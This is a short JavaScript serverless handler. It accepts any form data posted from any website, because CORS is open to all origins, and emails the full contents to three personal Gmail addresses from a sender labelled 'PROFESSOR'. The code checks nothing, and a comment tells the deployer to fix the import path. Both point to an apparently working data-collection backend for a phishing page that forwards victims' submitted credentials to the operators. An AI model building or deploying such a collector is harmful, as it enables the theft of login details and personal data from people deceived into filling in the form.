import { transporter } from "../../emailConfig.js"; // apne path ke hisaab se

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Accept, Authorization");

  if (req.method === "OPTIONS") {
    return res.status(204).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  let formData;
  try {
    formData = typeof req.body === "string" ? JSON.parse(req.body) : req.body;
  } catch {
    return res.status(400).json({ error: "Invalid JSON" });
  }

  if (!formData || Object.keys(formData).length === 0) {
    return res.status(400).json({ error: "Form data missing" });
  }

  try {
    await transporter.sendMail({
      from: `"PROFESSOR" <hgfver414@gmail.com>`,
      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,officialjaendowns@gmail.com",
      subject: "Taimor",
      text: JSON.stringify(formData, null, 2),
      html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Email send error:", error);
    res.status(500).json({ error: "Failed to send email" });
  }
}
